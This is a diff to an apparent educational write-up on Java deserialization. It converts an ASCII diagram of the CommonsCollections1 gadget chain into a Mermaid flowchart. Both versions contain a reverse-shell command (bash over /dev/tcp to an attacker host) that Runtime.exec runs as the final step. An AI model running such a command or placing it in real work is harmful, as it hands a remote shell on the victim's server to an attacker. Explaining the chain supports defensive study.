@@ -70,36 +70,20 @@ If the attacker supplies a `LazyMap` containing the `ChainedTransformer`, the it
 
 Below is an ASCII representation of the complete execution flow when the CommonsCollections1 payload is deserialized by a vulnerable server.
 
-```text
-+--------------------------------------------------------------------------+
-|  Vulnerable Server JVM (ObjectInputStream.readObject())                  |
-+--------------------------------------------------------------------------+
-                                    |
-                                    v
- 1. Deserializes Kick-off Gadget: [sun.reflect.annotation.AnnotationInvocationHandler]
-                                    |
-    (Inside its readObject() method, it accesses elements of an internal Map)
-                                    |
-                                    v
- 2. Map triggers Bridge Gadget:   [org.apache.commons.collections.map.LazyMap]
-                                    |
-    (LazyMap tries to populate a missing key by calling transform() on its factory)
-                                    |
-                                    v
- 3. Bridge calls Sink Gadget:     [org.apache.commons.collections.functors.ChainedTransformer]
-                                    |
-    (Iterates through an array of InvokerTransformers, passing output to input)
-                                    |
-                                    v
- 4. Reflection Execution:
-    a. InvokerTransformer 1 ->  java.lang.Runtime.getMethod("getRuntime")
-    b. InvokerTransformer 2 ->  getRuntime.invoke()  [Returns Runtime instance]
-    c. InvokerTransformer 3 ->  Runtime.exec("bash -i >& /dev/tcp/attck/444 0>&1")
-                                    |
-                                    v
-+--------------------------------------------------------------------------+
-|  OS Level Execution: Reverse Shell Sent to Attacker                      |
-+--------------------------------------------------------------------------+
+```mermaid
+flowchart TD
+    JVM["Vulnerable Server JVM (ObjectInputStream.readObject())"]
+    Kickoff["1. Deserializes Kick-off Gadget: [sun.reflect.annotation.AnnotationInvocationHandler] <br/> (Inside its readObject() method, it accesses elements of an internal Map)"]
+    Bridge["2. Map triggers Bridge Gadget: [org.apache.commons.collections.map.LazyMap] <br/> (LazyMap tries to populate a missing key by calling transform() on its factory)"]
+    Sink["3. Bridge calls Sink Gadget: [org.apache.commons.collections.functors.ChainedTransformer] <br/> (Iterates through an array of InvokerTransformers, passing output to input)"]
+    Reflection["4. Reflection Execution: <br/> a. InvokerTransformer 1 -> java.lang.Runtime.getMethod('getRuntime') <br/> b. InvokerTransformer 2 -> getRuntime.invoke() [Returns Runtime instance] <br/> c. InvokerTransformer 3 -> Runtime.exec('bash -i >& /dev/tcp/attck/444 0>&1')"]
+    OS["OS Level Execution: Reverse Shell Sent to Attacker"]
+
+    JVM --> Kickoff
+    Kickoff --> Bridge
+    Bridge --> Sink
+    Sink --> Reflection
+    Reflection --> OS
 ```
 
 ---
